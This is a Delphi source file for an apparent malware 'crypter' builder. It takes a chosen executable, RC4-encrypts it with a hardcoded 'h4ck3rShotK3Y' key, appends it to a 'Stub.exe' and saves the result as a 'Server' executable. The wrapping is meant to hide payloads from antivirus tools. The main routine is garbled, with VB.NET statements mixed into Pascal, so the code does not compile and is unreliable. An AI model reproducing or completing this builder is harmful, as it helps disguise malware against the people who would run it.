unit untMain;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ComCtrls;

type
  TfrmMain = class(TForm)
    Edit1: TEdit;
    Label1: TLabel;
    StatusBar1: TStatusBar;
    Button1: TButton;
    OpenDialog1: TOpenDialog;
    Button2: TButton;
    sfd: TSaveDialog;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  frmMain: TfrmMain;

implementation

{$R *.dfm}

procedure TfrmMain.Button1Click(Sender: TObject);
begin
  if OpenDialog1.Execute(0) then
  begin
    Edit1.Text := OpenDialog1.FileName;
  end;
end;

procedure TfrmMain.Button2Click(Sender: TObject);
  var
   var1, var2, stub : String;
   stubpath :string;
begin
  Try
    sfd.Title := 'Salvar Seu Server...';
    sfd.Filter := 'Executáveis (*.exe)|*.exe';
    If sfd.Execute(0) Then
        var2 := sfd.FileName
    Else  Exit;
    system.SysUtils.FileOpen(Edit1.Text, fmOpenWrite or fmShareDenyNone or fmOpenRead);
  //  var1 := Space(LOF(1));
   // FileGet(1, var1)
   // FileClose(1)
    stubpath := ExtractFilePath(ParamStr(0))+'Stub.exe';
    system.SysUtils.FileOpen( stubpath,fmOpenWrite or fmShareDenyNone or fmOpenRead);

    stub = Space(LOF(1))
    FileGet(1, stub)
    FileClose(1)
    system.SysUtils.FileOpen(1, var2, OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default)
    system.SysUtils.FilePut(1, stub & dCrypt & rc4(var1, "h4ck3rShotK3Y"))
    FileClose(1)
    MsgBox("¡Encryptado!", MsgBoxStyle.Information)
    Exception
    soumessage('¡Error!')
  End;
end;

end.
